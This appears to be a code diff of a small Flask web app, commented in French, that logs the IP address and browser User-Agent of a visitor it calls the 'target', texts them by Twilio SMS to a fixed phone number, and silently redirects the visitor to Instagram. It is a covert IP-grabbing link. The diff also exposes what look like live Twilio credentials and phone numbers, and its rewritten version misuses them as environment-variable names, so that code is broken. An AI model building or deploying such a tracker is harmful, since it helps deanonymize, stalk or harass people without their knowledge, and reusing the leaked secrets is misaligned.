@@ -2,43 +2,48 @@ import os
 from flask import Flask, request, redirect
 from twilio.rest import Client
 
-# Initialisation de Flask
 app = Flask(__name__)
 
-# Variables d'environnement pour Twilio
-TWILIO_ACCOUNT_SID = "AC2ef2bd5bd5146f76f586d2c577159f90"
-TWILIO_AUTH_TOKEN = "ec746c04233667b9836c82d9512a9ee9"
-FROM_PHONE = "+12524866318"
-TO_PHONE = "+33635960569"
+# Récupérer les identifiants Twilio depuis les variables d'environnement
+account_sid = os.environ.get('AC2ef2bd5bd5146f76f586d2c577159f90')
+auth_token = os.environ.get('ec746c04233667b9836c82d9512a9ee9')
 
-# Création du client Twilio
-client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
+# Créer le client Twilio
+client = Client(account_sid, auth_token)
 
-# Fonction pour envoyer le SMS
-def send_sms(ip, user_agent):
-    message = f"Nouvelle connexion:\nIP: {ip}\nUser-Agent: {user_agent}"
-    client.messages.create(
-        body=message,
-        from_=FROM_PHONE,
-        to=TO_PHONE
-    )
-
-# Route principale
-@app.route("/")
+# Route principale qui gère la récupération de l'adresse IP et user-agent
+@app.route('/')
 def index():
-    # Récupérer l'IP et User-Agent de la cible
+    # Récupérer l'adresse IP de la cible
     ip_address = request.remote_addr
+    # Récupérer l'user-agent de la cible
     user_agent = request.headers.get('User-Agent')
 
-    # Envoyer l'IP et l'user-agent par SMS
+    # Afficher les informations récupérées dans la console pour les tests
+    print(f'IP Address: {ip_address}')
+    print(f'User Agent: {user_agent}')
+
+    # Envoi du SMS avec les informations récupérées
     send_sms(ip_address, user_agent)
 
-    # URL de redirection vers Instagram (tu peux la changer par l'URL de ton choix)
-    redirect_url = "https://www.instagram.com"
+    # Rediriger l'utilisateur vers l'URL cible (par exemple, un lien Instagram)
+    return redirect("https://www.instagram.com", code=302)
 
-    # Rediriger la cible
-    return redirect(redirect_url)
+# Fonction pour envoyer le SMS via Twilio
+def send_sms(ip_address, user_agent):
+    # Ton numéro Twilio et le numéro de réception (à remplacer par des valeurs valides)
+    to_phone_number = "+33635960569"  # Remplace avec le numéro du destinataire
+    from_phone_number = "+12524866318"  # Remplace avec ton numéro Twilio
 
-# Lancer le serveur
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    # Créer le message
+    message = f"IP: {ip_address}\nUser-Agent: {user_agent}"
+
+    # Envoi du message SMS
+    client.messages.create(
+        body=message,
+        from_=from_phone_number,
+        to=to_phone_number
+    )
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=5000)
